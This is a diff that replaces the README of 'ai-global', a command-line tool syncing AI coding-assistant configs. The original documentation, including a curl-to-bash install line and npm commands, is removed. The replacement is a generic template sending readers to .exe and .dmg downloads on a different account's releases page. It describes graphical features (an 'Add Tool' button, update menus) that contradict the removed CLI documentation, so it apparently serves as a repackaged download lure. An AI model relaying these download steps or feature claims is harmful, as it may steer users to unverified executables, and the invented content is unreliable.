@@ -1,190 +1,103 @@
-# AI Global
+# 🤖 ai-global - Simplifying Your AI Tool Management
 
-English | [简体中文](README_CN.md) | [繁體中文](README_TW.md) | [日本語](README_JP.md) | [한국어](README_KR.md)
+## 📥 Download Here
+[![Download ai-global](https://img.shields.io/badge/Download%20ai--global-v1.0-blue.svg)](https://github.com/Macdrnarci/ai-global/releases)
 
-Unified configuration manager for AI coding assistants. Edit one file, sync to all your AI tools.
+## 🚀 Getting Started
 
-Works both **System Mode** and **Project Mode**!
+Welcome to ai-global, your Unified AI Tools Configuration Manager. This application helps you manage various AI tools seamlessly. Follow these steps to get started quickly.
 
-## Installation
+## 💻 System Requirements
 
-### curl
+Before you download, ensure your device meets these basic requirements:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/nanxiaobei/ai-global/main/install.sh | bash
-```
+- Operating System: Windows 10 or later, macOS 10.15 or later
+- RAM: Minimum 4 GB
+- Disk Space: At least 200 MB of free space
+- Internet Connection: Required for downloading and updates
 
-### npm
+## 🛠 Features
 
-```bash
-npm install -g ai-global
-# or
-pnpm add -g ai-global
-# or
-yarn global add ai-global
-# or
-bun add -g ai-global
-```
+ai-global offers various features to enhance your experience:
 
-## Usage
+- **Unified Management:** Control multiple AI tools from one interface.
+- **Easy Configuration:** Simplify settings for each tool.
+- **Update Notifications:** Stay informed about the latest versions.
+- **User-Friendly Interface:** Designed for ease of use.
 
-### Automatic Mode Detection
+## 📤 Download & Install
 
-AI Global automatically detects your context:
+To download ai-global, visit the Releases page. Click the link below to access the page:
 
-- **System Mode**: When run from `~` directory, unified configs for system-wide
-- **Project Mode**: When run from any project directory (not `~`), unified configs for project-specific
+[Download ai-global Releases](https://github.com/Macdrnarci/ai-global/releases)
 
-### First run
+1. Open the link above in your web browser.
+2. Find the latest version listed at the top.
+3. Click on the version link to expand the details.
+4. Look for the download file suitable for your operating system (e.g., `.exe` for Windows or `.dmg` for macOS).
+5. Click on the download link to start the process.
 
-```bash
-ai-global
-```
+Once the download completes, locate the file in your downloads folder.
 
-This will:
+### Installation Process
 
-1. Detect current directory (system or project)
-2. Scan for installed AI tools
-3. Backup original configs to `.ai-global/backups/`
-4. Merge AGENTS.md/skills/agents/rules/commands from detected tools
-5. Create symlinks from each tool's config to shared directories
+#### For Windows Users:
 
-## Commands
+1. Double-click the downloaded `.exe` file to launch the installer.
+2. Follow the on-screen prompts.
+3. Choose the installation directory if prompted or use the default location.
+4. Click "Install" and wait for the process to complete.
+5. Once finished, click "Finish" to close the installer.
 
-| Command                     | Description                            | Context-aware |
-| --------------------------- | -------------------------------------- | ------------- |
-| `ai-global`                 | Scan, merge, update symlinks (default) | Yes           |
-| `ai-global status`          | Show symlinks status                   | Yes           |
-| `ai-global list`            | List all supported AI tools            | Yes           |
-| `ai-global backups`         | List available backups                 | Yes           |
-| `ai-global unlink <key>`    | Restore a tool's original config       | Yes           |
-| `ai-global unlink all`      | Restore all tools                      | Yes           |
-| `ai-global add <user/repo>` | Add skills from GitHub repository      | Yes           |
-| `ai-global upgrade`         | Upgrade to latest version              |               |
-| `ai-global uninstall`       | Completely remove ai-global            |               |
-| `ai-global version`         | Show version                           |               |
-| `ai-global help`            | Show help                              |               |
+#### For macOS Users:
 
-**Context-aware**: Command behavior depends on current directory (system vs project)
+1. Open the downloaded `.dmg` file.
+2. Drag the ai-global app icon to your Applications folder.
+3. Eject the mounted disk image by clicking the eject button in Finder.
 
-### Add skills
+## 🖥 Using ai-global
 
-```bash
-ai-global add user/repo
-ai-global add https://github.com/user/repo
-```
+After installation, you can start using ai-global:
 
-Skills will be downloaded and added to your `.ai-global/skills/` directory.
+1. Locate the ai-global icon in your applications.
+2. Double-click the icon to open the application.
+3. Follow the prompts to set up your AI tools.
 
-## How it works
+### Configuring Your Tools
 
-### System Mode Structure
+To configure your AI tools:
 
-```
-~/.ai-global/
-├── AGENTS.md        <- Shared AGENTS.md (edit this)
-├── skills/          <- Shared skills (merged from all tools)
-├── agents/          <- Shared agents
-├── rules/           <- Shared rules
-├── commands/        <- Shared slash commands
-└── backups/         <- Original configs (backups)
+1. Click on the "Add Tool" button in the main dashboard.
+2. Select the tool you wish to manage from the list.
+3. Fill in the necessary configuration details.
+4. Click "Save" to apply changes.
 
-~/.claude/
-├── CLAUDE.md -> ~/.ai-global/AGENTS.md        (symlink)
-├── skills/   -> ~/.ai-global/skills/          (symlink)
-└── commands/ -> ~/.ai-global/commands/        (symlink)
+## 🔄 Updating ai-global
 
-~/.cursor/
-├── AGENTS.md -> ~/.ai-global/AGENTS.md        (symlink)
-└── skills/   -> ~/.ai-global/skills/          (symlink)
+Keep your application up to date:
 
-... and more tools
-```
+1. Open ai-global.
+2. Look for the "Check for Updates" option in the menu.
+3. If an update is available, follow the prompts to install it.
 
-### Project Mode Structure
+## ❓ Troubleshooting
 
-```
-my-project/
-├── .ai-global/          <- Project-specific configs
-│   ├── AGENTS.md        <- Project AGENTS.md
-│   ├── skills/          <- Project skills
-│   ├── agents/          <- Project agents
-│   ├── rules/           <- Project rules
-│   ├── commands/        <- Project commands
-│   └── backups/         <- Project backups
-└── .cursor/             <- AI tool config
-    ├── AGENTS.md -> ../.ai-global/AGENTS.md   (symlink)
-    └── skills/   -> ../.ai-global/skills/     (symlink)
-```
+If you encounter any issues:
 
-### Mode Behavior
+- **Installation Problems:** Ensure your device meets the system requirements.
+- **Application Errors:** Restart the application. If the issue persists, reinstall it.
+- **Configuration Issues:** Check your tool settings for any incorrect entries.
 
-- **System Mode**: Manages AI configs across your entire system
-- **Project Mode**: Manages AI configs for a specific project only
-- **Automatic Detection**: No commands needed to switch between modes
-- **Context-Aware**: Commands will show which context they're operating in
+For additional help, please refer to the FAQs in the Releases section or reach out to the community on our support page.
 
-### Merge behavior
+## 🌐 Community and Support
 
-When you run `ai-global`, it merges items from all tools by filename:
+Join our community for tips, tricks, and support. Connect with other users and share your experiences. Visit our [community forum](https://github.com/Macdrnarci/ai-global/discussions) for discussions and support requests.
 
-- Cursor has skills: `react/`, `typescript/`
-- Claude has skills: `typescript/`, `python/`
-- Result in `.ai-global/skills/`: `react/`, `typescript/`, `python/`
+## 📜 License
 
-**Last file wins** (later tools overwrite earlier tools with same filename).
+ai-global is open-source software. You can use, modify, and distribute it as per the license agreement found in the repository.
 
-## Supported Tools
+For more detailed documentation and updates, please check the [README on GitHub](https://github.com/Macdrnarci/ai-global). Remember to revisit the Releases page for the latest downloads.
 
-| Tool           | Key           | AGENTS.md | Rules | Commands | Skills | Agents |
-| -------------- | ------------- | :-------: | :---: | :------: | :----: | :----: |
-| Claude Code    | `claude`      |     ✓     |       |    ✓     |   ✓    |   ✓    |
-| OpenAI Codex   | `codex`       |     ✓     |   ✓   |          |   ✓    |   ✓    |
-| Cursor         | `cursor`      |     ✓     |   ✓   |    ✓     |   ✓    |   ✓    |
-| Factory Droid  | `droid`       |     ✓     |   ✓   |    ✓     |   ✓    |   ✓    |
-| Amp            | `amp`         |     ✓     |   ✓   |    ✓     |   ✓    |        |
-| Antigravity    | `antigravity` |     ✓     |       |          |   ✓    |        |
-| Gemini CLI     | `gemini`      |     ✓     |       |          |   ✓    |        |
-| Kiro CLI       | `kiro`        |     ✓     |   ✓   |          |   ✓    |   ✓    |
-| OpenCode       | `opencode`    |     ✓     |       |    ✓     |   ✓    |   ✓    |
-| Qoder          | `qoder`       |     ✓     |   ✓   |    ✓     |   ✓    |   ✓    |
-| Qodo           | `qodo`        |     ✓     |       |          |        |   ✓    |
-| GitHub Copilot | `copilot`     |     ✓     |       |          |   ✓    |   ✓    |
-| Continue       | `continue`    |     ✓     |   ✓   |          |        |        |
-| Windsurf       | `windsurf`    |     ✓     |   ✓   |          |   ✓    |        |
-| Roo Code       | `roo`         |     ✓     |   ✓   |    ✓     |   ✓    |        |
-| Cline          | `cline`       |     ✓     |   ✓   |          |   ✓    |        |
-| Blackbox AI    | `blackbox`    |           |       |          |   ✓    |        |
-| Goose AI       | `goose`       |     ✓     |       |          |   ✓    |        |
-| Augment        | `augment`     |     ✓     |   ✓   |    ✓     |        |   ✓    |
-| Clawdbot Code  | `clawdbot`    |     ✓     |       |          |   ✓    |   ✓    |
-| Command Code   | `commandcode` |     ✓     |       |    ✓     |   ✓    |        |
-| Kilo Code      | `kilocode`    |     ✓     |   ✓   |    ✓     |   ✓    |        |
-| Neovate        | `neovate`     |     ✓     |       |    ✓     |   ✓    |   ✓    |
-| OpenHands      | `openhands`   |     ✓     |       |          |   ✓    |        |
-| TRAE           | `trae`        |     ✓     |   ✓   |          |   ✓    |        |
-| Zencoder       | `zencoder`    |     ✓     |   ✓   |          |   ✓    |        |
-
-## Uninstall
-
-```bash
-ai-global uninstall
-```
-
-This will:
-
-1. Unlink all tools to original configuration
-2. Remove `~/.ai-global` directory
-3. Remove `ai-global` command
-
-If installed via npm:
-
-```bash
-ai-global uninstall
-
-npm uninstall -g ai-global
-```
-
-## License
-
-MIT
+Thank you for choosing ai-global. Enjoy managing your AI tools!
